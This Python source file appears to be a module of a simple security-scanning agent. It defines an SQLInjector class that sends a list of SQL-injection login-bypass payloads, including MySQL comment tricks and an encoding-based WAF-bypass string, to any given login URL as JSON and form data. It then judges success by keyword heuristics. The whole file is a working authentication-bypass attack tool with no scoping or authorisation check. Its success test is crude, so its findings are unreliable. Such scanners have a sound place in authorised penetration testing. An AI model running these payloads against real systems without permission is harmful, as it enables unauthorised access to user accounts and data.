import requests
from colorama import Fore

class SQLInjector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = [
            # Generic / Universal
            "' OR 1=1 --",
            "' OR '1'='1",
            "admin' --",
            "admin' #",
            "' OR 1=1 #",
            "' OR 1=1 /*",
            
            # MySQL Specific (Auth Bypass & Comments)
            "admin' /*!50000OR*/ 1=1 --",
            "' OR 1=1 LIMIT 1 -- -",
            "' OR '1'='1' LIMIT 1 -- -",
            "admin' AND 1=1 -- -", 
            
            # Boolean / Logic
            "' OR TRUE --",
            "' OR 2>1 --",
            "1' OR '1'='1",
            
            # Stacked/Union (Less likely in simple login, but good for fuzzing)
            "') OR ('1'='1",
            "admin') --",
            
            # Hex/Encoding for WAF Bypass
            "0x61646d696e' --", # admin in hex
        ]

    def test_login(self, username_field="username", password_field="password"):
        """
        Tests the login endpoint with SQLi payloads.
        """
        print(f"{Fore.CYAN}[*] Starting SQLi Login Check on {self.target_url}")
        
        found_vulns = []

        for payload in self.payloads:
            # We assume a standard form/JSON structure. 
            # For this simple agent, we try both JSON and Form Data.
            
            data = {
                username_field: payload,
                password_field: "password" # Password usually matters less in Auth Bypass
            }
            
            try:
                # Try JSON
                response = requests.post(self.target_url, json=data, timeout=10)
                if self.is_successful_login(response):
                    print(f"{Fore.RED}[!!!] SQLi SUCCESS (JSON) with payload: {payload}")
                    found_vulns.append({"payload": payload, "method": "JSON"})
                    continue

                # Try Form Data
                response = requests.post(self.target_url, data=data, timeout=10)
                if self.is_successful_login(response):
                    print(f"{Fore.RED}[!!!] SQLi SUCCESS (Form) with payload: {payload}")
                    found_vulns.append({"payload": payload, "method": "Form"})
            
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Request failed: {e}")

        if not found_vulns:
            print(f"{Fore.GREEN}[-] No SQLi vulnerabilities found with provided payloads.")
        
        return found_vulns

    def is_successful_login(self, response):
        """
        Heuristics to detect successful login.
        """
        success_indicators = [
            "Welcome", 
            "Logout", 
            "My Account", 
            "Dashboard",
            "token",
            "user_id"
        ]
        
        failure_indicators = [
            "Invalid credentials",
            "Login failed",
            "Incorrect password",
            "User not found"
        ]

        if response.status_code == 200:
            content = response.text.lower()
            # If we see success terms and NOT failure terms
            for fail in failure_indicators:
                if fail.lower() in content:
                    return False
            
            # If status 200 and no explicit failure, it might be a success 
            # or just the login page reloading. 
            # We check for a token in JSON response logic often used in SPAs
            if "token" in content or "jwt" in content:
                 return True
                 
            return any(ind.lower() in content for ind in success_indicators)
            
        return False
